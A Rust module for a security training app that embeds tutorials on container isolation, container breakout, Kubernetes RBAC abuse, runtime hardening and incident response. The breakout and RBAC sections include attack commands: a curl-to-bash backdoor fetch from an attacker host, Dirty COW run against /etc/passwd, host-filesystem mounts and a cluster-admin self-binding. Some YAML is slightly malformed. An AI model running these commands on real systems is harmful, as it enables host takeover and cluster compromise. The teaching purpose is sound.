/// Container & Kubernetes Security tutorial phase
///
/// This module provides comprehensive container and Kubernetes security tutorials,
/// covering container isolation, breakout vectors, RBAC abuse, runtime hardening,
/// and incident response procedures.
use crate::model::{QuizStep, Step};
use crate::quiz::parse_question_file;
use std::fs;
use std::path::Path;
use uuid::Uuid;

pub const DOMAIN_CONTAINER_SECURITY: &str = "Container & Kubernetes Security";
const QUIZ_FILE_PATH: &str = "data/container_security/container-kubernetes-quiz.txt";

pub const CONTAINER_ISOLATION_STEPS: &[(&str, &str)] = &[
    (
        "Container Isolation Fundamentals",
        "OBJECTIVE: Understand container isolation mechanisms and identify potential security boundaries.

ACADEMIC BACKGROUND:
Container security relies on Linux kernel namespaces and cgroups to create isolated environments. According to MITRE ATT&CK, container isolation mechanisms can be bypassed through various techniques, making understanding these boundaries critical for security.

Key Isolation Mechanisms:
- PID namespace: Process isolation (each container has its own process tree)
- Network namespace: Network stack isolation (separate network interfaces and routing)
- Mount namespace: Filesystem isolation (separate view of the filesystem hierarchy)
- User namespace: User/group ID isolation (different UID/GID mappings)
- UTS namespace: Hostname and domain isolation
- IPC namespace: Inter-process communication isolation

STEP-BY-STEP PROCESS:

1. EXAMINE NAMESPACE ISOLATION:
   
   a) Check PID namespace isolation:
   ```bash
   # Run container and examine process tree
   docker run --rm -it alpine ps aux
   # Compare with host processes
   ps aux | head -10
   ```
   
   b) Test network namespace separation:
   ```bash
   # Check container network interfaces
   docker run --rm -it alpine ip link show
   # Check host network interfaces
   ip link show
   ```
   
   c) Verify mount namespace isolation:
   ```bash
   # Examine container filesystem
   docker run --rm -it alpine ls -la /
   # Check if host paths are visible
   docker run --rm -it alpine ls -la /host 2>/dev/null || echo 'Host not accessible'
   ```

2. ANALYZE CAPABILITY RESTRICTIONS:
   
   a) Check container capabilities:
   ```bash
   # Examine default capabilities
   docker run --rm -it alpine capsh --print
   
   # Compare with host capabilities
   capsh --print
   ```
   
   b) Test capability restrictions:
   ```bash
   # Try to perform privileged operations
   docker run --rm -it alpine mount --help
   docker run --rm -it --privileged alpine mount --help
   ```

3. INVESTIGATE SECURITY PROFILES:
   
   a) Check AppArmor/SELinux status:
   ```bash
   # Check AppArmor status
   docker run --rm -it alpine cat /proc/self/attr/current 2>/dev/null || echo 'No AppArmor'
   
   # Check SELinux context
   docker run --rm -it alpine cat /proc/self/attr/current 2>/dev/null || echo 'No SELinux'
   ```

DETECTION:
- Container processes visible from host: `ps aux | grep -E '(docker|containerd|runc)'`
- Excessive capabilities: `docker inspect <container> | grep Cap`
- Weak security profiles: `docker inspect <container> | grep -E '(AppArmor|Selinux)'`
- Host filesystem access: `docker exec <container> ls -la /host`

REMEDIATION:
- Use minimal base images and remove unnecessary tools
- Drop all non-essential capabilities using --cap-drop
- Apply AppArmor/SELinux profiles consistently
- Avoid privileged containers unless absolutely necessary
- Implement read-only root filesystems where possible
- Use user namespaces for UID mapping

TOOLS AND RESOURCES:
- Docker Bench for Security: Automated security checks
- Lynis: Security auditing tool
- OpenSCAP: Security compliance scanning
- Container Escape Tools: For testing isolation (authorized use only)

REFERENCES:
- Docker Security Documentation: https://docs.docker.com/engine/security/
- Linux Namespaces: https://man7.org/linux/man-pages/man7/namespaces.7.html
- MITRE ATT&CK Container Techniques: https://attack.mitre.org/matrices/enterprise/containers/"
    ),
    (
        "Container Breakout Vectors",
        "OBJECTIVE: Identify and exploit common container breakout vectors for security assessment.

ACADEMIC BACKGROUND:
Container breakout occurs when an attacker escapes the container's isolation mechanisms and gains access to the host system. According to research, common breakout vectors include CAP_SYS_ADMIN capability, Docker socket mounting, host filesystem mounts, kernel vulnerabilities, and runtime vulnerabilities.

Common Breakout Vectors:
- CAP_SYS_ADMIN capability: Full administrative privileges
- Docker socket mounting: Control over container daemon
- Host filesystem mounts: Direct host file access
- Kernel vulnerabilities: Memory corruption and privilege escalation
- Runtime vulnerabilities: Container daemon exploitation

STEP-BY-STEP PROCESS:

1. PRIVILEGED CONTAINER ESCAPES:
   
   a) Deploy privileged container:
   ```bash
   # Run privileged container
   docker run --privileged -it --name breakout-test ubuntu bash
   
   # Inside container - mount host filesystem
   mount /dev/sda1 /mnt/host
   ls -la /mnt/host
   ```
   
   b) Access host processes:
   ```bash
   # View host processes
   ps aux | head -10
   cat /proc/1/cgroup
   ```
   
   c) Modify host system:
   ```bash
   # Modify host iptables
   iptables -L
   # Install backdoors
   curl http://attacker.com/backdoor.sh | bash
   ```

2. DOCKER SOCKET EXPLOITATION:
   
   a) Mount Docker socket:
   ```bash
   # Run container with Docker socket
   docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker bash
   
   # Use Docker API from container
   docker ps
   docker images
   ```
   
   b) Create privileged containers:
   ```bash
   # Create privileged sibling container
   docker run --privileged -d -v /:/host --name host-access ubuntu tail -f /dev/null
   
   # Access host filesystem
   docker exec host-access ls -la /host
   ```

3. KERNEL VULNERABILITY CHAINS:
   
   a) Identify kernel version:
   ```bash
   # Check kernel version
   uname -a
   cat /proc/version
   
   # Search for known CVEs
   searchsploit linux kernel 4.15
   ```
   
   b) Test Dirty COW (CVE-2016-5195):
   ```bash
   # Compile Dirty COW exploit (if vulnerable)
   gcc -pthread dirtyc0w.c -o dirtyc0w
   ./dirtyc0w /etc/passwd root:x:0:0:root:/root:/bin/bash
   ```

4. RUNTIME VULNERABILITIES:
   
   a) Test runc vulnerability (CVE-2019-5736):
   ```bash
   # Check runc version
   runc --version
   
   # Test for vulnerability (if vulnerable version)
   # Exploit code would replace host runc binary
   ```

DETECTION:
- Privileged containers: `docker ps --filter 'privileged=true'`
- Docker socket mounts: `docker ps --filter 'volume=/var/run/docker.sock'`
- Host path volumes: `docker inspect <container> | grep hostPath`
- Capable containers: `docker inspect <container> | grep -A 10 'Capabilities'`
- Suspicious container behavior: Unusual process activity

REMEDIATION:
- Never use --privileged flag in production
- Avoid mounting Docker socket or other critical host paths
- Keep kernel and container runtime updated
- Implement seccomp profiles to restrict system calls
- Use AppArmor/SELinux profiles for additional confinement
- Regular security scanning and monitoring

TOOLS AND RESOURCES:
- CDK (Container Penetration Toolkit): Comprehensive container security toolkit
- DeepCE: Docker enumeration and exploitation tool
- Container Escape Scripts: For authorized testing
- LinPEAS: Linux privilege escalation enumeration

REFERENCES:
- Container Escape Techniques: https://blog.dragonsector.pl/2019/02/28/docker-container-escape/
- runc Vulnerability CVE-2019-5736: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736
- Dirty COW Exploit: https://github.com/dirtycow/dirtycow.github.io"
    ),
];

pub const KUBERNETES_SECURITY_STEPS: &[(&str, &str)] = &[
    (
        "Kubernetes RBAC Abuse",
        "OBJECTIVE: Identify and exploit RBAC misconfigurations for unauthorized cluster access.

ACADEMIC BACKGROUND:
Kubernetes Role-Based Access Control (RBAC) governs API access authorization. RBAC misconfigurations are among the most common security issues in Kubernetes environments, often leading to privilege escalation and cluster compromise.

RBAC Components:
- Roles: Define permissions within a namespace
- ClusterRoles: Define permissions cluster-wide
- RoleBindings: Bind roles to users/groups/service accounts
- ClusterRoleBindings: Bind cluster roles cluster-wide

Common RBAC Misconfigurations:
- Over-permissive wildcard permissions (*)
- Cluster-admin bindings to service accounts
- Role escalation paths
- Excessive service account permissions

STEP-BY-STEP PROCESS:

1. ENUMERATE RBAC PERMISSIONS:
   
   a) Check current permissions:
   ```bash
   # Check what you can do
   kubectl auth can-i --list
   
   # Check service account permissions
   kubectl auth can-i --as=system:serviceaccount:default:default --list
   
   # Enumerate cluster roles
   kubectl get clusterroles -o wide
   kubectl describe clusterrole <role-name>
   ```
   
   b) Examine role bindings:
   ```bash
   # List cluster role bindings
   kubectl get clusterrolebindings
   
   # Check for dangerous bindings
   kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\")'
   
   # Find service accounts with elevated permissions
   kubectl get clusterrolebindings -o json | jq '.items[] | {name: .metadata.name, subjects: .subjects}'
   ```

2. SERVICE ACCOUNT EXPLOITATION:
   
   a) Locate service account tokens:
   ```bash
   # Inside a pod - find service account token
   cat /var/run/secrets/kubernetes.io/serviceaccount/token
   cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
   
   # Test token permissions
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   curl -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/pods
   ```
   
   b) Enumerate with service account:
   ```bash
   # Use kubectl with service account
   kubectl --token=$TOKEN --namespace=default get pods
   
   # Try to escalate privileges
   kubectl --token=$TOKEN create clusterrolebinding temp-admin --clusterrole=cluster-admin --serviceaccount=default:default
   ```

3. PRIVILEGE ESCALATION TECHNIQUES:
   
   a) Create privileged pods:
   ```yaml
   # privileged-pod.yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: privileged-pod
   spec:
     containers:
     - name: attack-container
       image: ubuntu
       securityContext:
         privileged: true
       command: [\"sleep\", \"3600\"]
   ```
   
   b) Mount host filesystem access:
   ```yaml
   # host-mount-pod.yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: host-mount
   spec:
     containers:
     - name: host-access
       image: ubuntu
       volumeMounts:
       - name: host-root
         mountPath: /host
     volumes:
     - name: host-root
       hostPath:
         path: /
   ```

4. WILDCARD PERMISSION ABUSE:
   
   a) Test wildcard permissions:
   ```bash
   # Check for wildcard permissions
   kubectl get clusterrole -o yaml | grep -A 5 '\"*\"'
   
   # Create resources if allowed
   kubectl create deployment test-deployment --image=nginx
   kubectl expose deployment test-deployment --port=80
   ```

DETECTION:
- Over-permissive roles: `kubectl get clusterroles -o json | jq '.items[].rules[] | select(.resources==[\"*\"])'`
- Cluster-admin bindings: `kubectl get clusterrolebindings | grep cluster-admin`
- Wildcard verbs: `kubectl get roles -o json | jq '.items[].rules[] | select(.verbs==[\"*\"])'`
- Service account tokens in pods: `kubectl exec <pod> -- ls /var/run/secrets/kubernetes.io/serviceaccount/`

REMEDIATION:
- Apply principle of least privilege to all roles and bindings
- Avoid wildcard permissions unless absolutely necessary
- Regularly audit role bindings and service account permissions
- Use RBAC authorization mode exclusively
- Implement Pod Security Policies or Pod Security Admission
- Separate namespaces for different applications/teams

TOOLS AND RESOURCES:
- Pebble: Kubernetes privilege escalation checker
- kubectl-auth-can-i: Permission testing tool
- kube-hunter: Kubernetes penetration testing tool
- Kubesec: Kubernetes security analysis tool

REFERENCES:
- Kubernetes RBAC Documentation: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Kubernetes Security Hardening Guide: https://kubernetes.io/docs/concepts/security-cluster-hardening/
- MITRE ATT&CK Kubernetes: https://attack.mitre.org/matrices/enterprise/kubernetes/"
    ),
    (
        "Runtime Security and Hardening",
        "OBJECTIVE: Implement and validate runtime security controls for Kubernetes workloads.

ACADEMIC BACKGROUND:
Kubernetes runtime security focuses on protecting workloads during execution through security contexts, policies, and monitoring. Effective runtime hardening prevents common attack vectors including container escape, privilege escalation, and lateral movement.

Runtime Security Components:
- Security Contexts: Pod and container-level security settings
- Pod Security Admission: Enforce security standards
- Network Policies: Control pod-to-pod communication
- Admission Controllers: Validate and mutate API requests
- Runtime Monitoring: Detect anomalous behavior

STEP-BY-STEP PROCESS:

1. IMPLEMENT SECURITY CONTEXTS:
   
   a) Pod-level security context:
   ```yaml
   # secure-pod.yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: secure-pod
   spec:
     securityContext:
       runAsNonRoot: true
       runAsUser: 1000
       fsGroup: 2000
     containers:
     - name: app
       image: nginx:1.21
       securityContext:
         allowPrivilegeEscalation: false
         readOnlyRootFilesystem: true
         capabilities:
           drop:
           - ALL
           add:
           - NET_BIND_SERVICE
   ```
   
   b) Validate security context:
   ```bash
   # Check pod security context
   kubectl get pod secure-pod -o yaml | grep -A 10 securityContext
   
   # Verify container security
   kubectl exec secure-pod -- id
   kubectl exec secure-pod -- cat /proc/self/status | grep CapEff
   ```

2. CONFIGURE POD SECURITY ADMISSION:
   
   a) Create security policy:
   ```yaml
   # pod-security-policy.yaml
   apiVersion: policy/v1beta1
   kind: PodSecurityPolicy
   metadata:
     name: restricted-psp
   spec:
     privileged: false
     allowPrivilegeEscalation: false
     requiredDropCapabilities:
       - ALL
     volumes:
       - 'configMap'
       - 'emptyDir'
       - 'projected'
       - 'secret'
       - 'downwardAPI'
       - 'persistentVolumeClaim'
     runAsUser:
       rule: 'MustRunAsNonRoot'
     seLinux:
       rule: 'RunAsAny'
     fsGroup:
       rule: 'RunAsAny'
   ```
   
   b) Apply and test policy:
   ```bash
   # Apply policy
   kubectl apply -f pod-security-policy.yaml
   
   # Test with privileged pod (should fail)
   kubectl run privileged-test --image=nginx --privileged
   ```

3. IMPLEMENT NETWORK POLICIES:
   
   a) Default deny policy:
   ```yaml
   # default-deny.yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
n     name: default-deny
   spec:
     podSelector: {}
     policyTypes:
     - Ingress
     - Egress
   ```

DETECTION:
- Security context violations: `kubectl get events --field-selector reason=FailedScheduling`
- Network policy violations: `kubectl logs -n kube-system -l k8s-app=calico-node`
- Admission controller rejections: `kubectl get events --field-selector reason=FailedAdmission`
- Runtime anomalies: Falco alerts, container escape attempts
- Privilege escalation: Unusual service account usage

REMEDIATION:
- Enforce security contexts across all namespaces
- Implement default deny network policies
- Use admission controllers for policy enforcement
- Deploy runtime monitoring and alerting
- Regular security scanning and compliance checking
- Implement incident response procedures

TOOLS AND RESOURCES:
- Falco: Runtime security monitoring
- OPA/Gatekeeper: Policy as code enforcement
- Calico: Network policy implementation
- Trivy: Container image scanning
- kube-bench: CIS benchmark checking

REFERENCES:
- Kubernetes Security Contexts: https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
- Pod Security Admission: https://kubernetes.io/docs/concepts/security/pod-security-admission/
- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes"
    ),
    (
        "Incident Response and Forensics",
        "OBJECTIVE: Develop incident response procedures for container and Kubernetes security incidents.

ACADEMIC BACKGROUND:
Container and Kubernetes environments require specialized incident response approaches due to their ephemeral and distributed nature. Effective response involves rapid detection, containment, evidence collection, and recovery while preserving forensic artifacts.

Incident Response Lifecycle:
1. Preparation: Tools, procedures, and monitoring
2. Detection: Identify security incidents
3. Containment: Isolate affected resources
4. Investigation: Collect and analyze evidence
5. Recovery: Restore secure operations
6. Post-incident: Lessons learned and improvements

Container-Specific Challenges:
- Ephemeral nature of containers
- Distributed logging and monitoring
- Rapid scaling and deployment
- Shared kernel and resources
- Complex supply chains

STEP-BY-STEP PROCESS:

1. PREPARE MONITORING INFRASTRUCTURE:
   
   a) Deploy comprehensive logging:
   ```yaml
   # fluentd-config.yaml
   apiVersion: v1
   kind: ConfigMap
   metadata:
     name: fluentd-config
   data:
     fluent.conf: |
       <source>
         @type tail
         path /var/log/containers/*.log
         pos_file /var/log/fluentd-containers.log.pos
         tag kubernetes.*
         format json
         time_key time
         time_format %Y-%m-%dT%H:%M:%S.%NZ
       </source>
       
       <match kubernetes.**>
         @type elasticsearch
         host elasticsearch.logging.svc.cluster.local
         port 9200
         index_name kubernetes-logs
       </match>
   ```
   
   b) Configure audit logging:
   ```yaml
   # audit-policy.yaml
   apiVersion: audit.k8s.io/v1
   kind: Policy
   rules:
   - level: Metadata
        namespaces: [\"default\", \"kube-system\"]
      - level: Request
        resources: [\"pods\", \"services\", \"secrets\"]
      - level: RequestResponse
        resources: [\"deployments\", \"replicasets\"]
   ```

2. ESTABLISH DETECTION RULES:
   
   a) Falco rules for container security:
   ```yaml
   # falco-container-rules.yaml
   - rule: Detect privileged container usage
     desc: Detect creation of privileged containers
     condition: >
       kubectl.create.container and
       (container.privileged = true or
        container.host_pid = true or
        container.host_network = true)
     output: >
       Privileged container created (user=%user.name container=%container.name 
       image=%container.image)
     priority: WARNING
     tags: [kubernetes, privileged]
   ```

3. ESTABLISH CONTAINMENT PROCEDURES:
   
   a) Network isolation:
   ```bash
   # Isolate compromised namespace
   kubectl create networkpolicy isolate-compromised --namespace=compromised \\
     --selector=app=compromised --pod-selector=\"\" \\
     --policy-types=Ingress,Egress
   
   # Quarantine specific pod
   kubectl label pod compromised-pod quarantine=true 
     --overwrite
   kubectl patch deployment compromised-deployment -p '{\"spec\":{\"replicas\":0}}'
   ```
   
   b) Scale down affected deployments:
   ```bash
   # Immediately scale to zero
   kubectl scale deployment compromised-app --replicas=0
   
   # Create forensic copy
   kubectl get deployment compromised-app -o yaml > forensic-deployment.yaml
   ```

4. FORENSIC EVIDENCE COLLECTION:
   
   a) Container forensics:
   ```bash
   # Create forensic copy of container
   docker export compromised-container > forensic-container.tar
   
   # Extract container filesystem
   mkdir forensic-analysis
   tar -xf forensic-container.tar -C forensic-analysis/
   
   # Analyze container filesystem
   find forensic-analysis/ -type f -exec grep -l \"malware\" {} \\;
   ```
   
   b) Kubernetes API audit logs:
   ```bash
   # Extract audit logs for time window
   grep \"2024-01-15T10:00:00\" /var/log/kubernetes/audit.log | \\
     grep \"compromised-service-account\" > api-audit.log
   
   # Analyze API calls
   jq '.user.username' api-audit.log | sort | uniq -c
   ```

5. RECOVERY AND HARDENING:
   
   a) Rebuild with security hardening:
   ```yaml
   # hardened-deployment.yaml
   apiVersion: apps/v1
   kind: Deployment
   metadata:
     name: hardened-app
   spec:
     template:
       spec:
         securityContext:
           runAsNonRoot: true
           fsGroup: 2000
         containers:
         - name: app
           image: app:v2-hardened
           securityContext:
             allowPrivilegeEscalation: false
             readOnlyRootFilesystem: true
           resources:
             requests:
               memory: \"256Mi\"
               cpu: \"250m\"
             limits:
               memory: \"512Mi\"
               cpu: \"500m\"
   ```
   
   b) Implement security controls:
   ```bash
   # Apply network policies
   kubectl apply -f security-network-policies.yaml
   
   # Enable Pod Security Admission
   kubectl label namespace secure-app pod-security.kubernetes.io/enforce=restricted
   
   # Deploy security monitoring
   kubectl apply -f falco-daemonset.yaml
   ```

DETECTION:
- Security events: Falco alerts, audit log anomalies
- Resource abuse: Unusual CPU/memory usage patterns
- Network activity: Suspicious connections, data exfiltration
- API access: Unauthorized requests, privilege escalation attempts
- Container behavior: Escape attempts, unusual process activity

REMEDIATION:
- Immediate isolation and containment
- Forensic evidence preservation
- Security control implementation
- System hardening and patching
- Monitoring and alerting enhancement
- Incident documentation and review

TOOLS AND RESOURCES:
- Falco: Runtime security monitoring and alerting
- OPA/Gatekeeper: Policy enforcement and compliance
- Velero: Backup and disaster recovery
- Trivy: Container and Kubernetes vulnerability scanning
- kube-hunter: Security assessment and penetration testing

REFERENCES:
- Kubernetes Incident Response Guide: https://kubernetes.io/docs/tasks/debug-application-cluster/debug-cluster/
- NIST Incident Response Framework: https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final
- Container Forensics: https://sans.org/blog/container-forensics/"
    ),
];

/// Build Container Isolation steps
pub fn get_container_isolation_steps() -> Vec<Step> {
    CONTAINER_ISOLATION_STEPS
        .iter()
        .map(|(title, description)| {
            Step::new_tutorial(
                Uuid::new_v4(),
                title.to_string(),
                description.to_string(),
                vec![
                    "container".to_string(),
                    "isolation".to_string(),
                    "security".to_string(),
                ],
            )
        })
        .collect()
}

/// Build Kubernetes Security steps
pub fn get_kubernetes_security_steps() -> Vec<Step> {
    KUBERNETES_SECURITY_STEPS
        .iter()
        .map(|(title, description)| {
            Step::new_tutorial(
                Uuid::new_v4(),
                title.to_string(),
                description.to_string(),
                vec![
                    "kubernetes".to_string(),
                    "rbac".to_string(),
                    "security".to_string(),
                ],
            )
        })
        .collect()
}

fn create_container_security_quiz_step() -> Result<Step, String> {
    let path = Path::new(QUIZ_FILE_PATH);
    if !path.exists() {
        return Err(format!("Quiz file not found: {}", path.display()));
    }

    let content = fs::read_to_string(path)
        .map_err(|e| format!("Failed to read quiz file {}: {}", path.display(), e))?;

    let questions = parse_question_file(&content)
        .map_err(|e| format!("Failed to parse quiz file {}: {}", path.display(), e))?;

    if questions.len() < 15 {
        return Err(format!(
            "Quiz file {} must contain at least 15 questions, found {}",
            path.display(),
            questions.len()
        ));
    }

    let quiz_step = QuizStep::new(
        Uuid::new_v4(),
        "Container & Kubernetes Security Quiz".to_string(),
        DOMAIN_CONTAINER_SECURITY.to_string(),
        questions,
    );

    Ok(Step::new_quiz(
        Uuid::new_v4(),
        "Container & Kubernetes Security Quiz".to_string(),
        vec!["quiz".to_string(), "container".to_string(), "kubernetes".to_string()],
        quiz_step,
    ))
}

/// Build Container & Kubernetes Security steps with quiz
pub fn get_container_security_steps() -> Vec<Step> {
    let mut steps = Vec::new();
    
    // Add container isolation steps
    steps.extend(get_container_isolation_steps());
    
    // Add kubernetes security steps  
    steps.extend(get_kubernetes_security_steps());

    // Add quiz step
    match create_container_security_quiz_step() {
        Ok(quiz_step) => steps.push(quiz_step),
        Err(err) => eprintln!("Warning: Failed to load Container Security quiz: {err}"),
    }

    steps
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_container_security_quiz_file_exists() {
        let path = Path::new(QUIZ_FILE_PATH);
        assert!(path.exists(), "Container security quiz file should exist");
    }

    #[test]
    fn test_container_security_quiz_minimum_questions() {
        let path = Path::new(QUIZ_FILE_PATH);
        let content = fs::read_to_string(path).expect("Should be able to read quiz file");
        
        let questions = parse_question_file(&content)
            .expect("Should be able to parse quiz file");

        assert!(
            questions.len() >= 15,
            "Quiz should have at least 15 questions, found {}",
            questions.len()
        );
    }

    #[test]
    fn test_get_container_security_steps_returns_steps() {
        let steps = get_container_security_steps();
        
        // Should have tutorial steps + quiz step
        assert!(
            steps.len() >= 6, // 2 container isolation + 3 kubernetes + 1 quiz
            "Should have at least 6 steps (2 container + 3 kubernetes + 1 quiz), found {}",
            steps.len()
        );
    }

    #[test]
    fn test_quiz_step_creation() {
        let quiz_result = create_container_security_quiz_step();
        assert!(quiz_result.is_ok(), "Quiz step creation should succeed");

        let quiz_step = quiz_result.unwrap();
        match quiz_step.content {
            crate::model::StepContent::Quiz { quiz_data: _ } => {}, // Expected
            _ => panic!("Quiz step should have Quiz content"),
        }
    }
}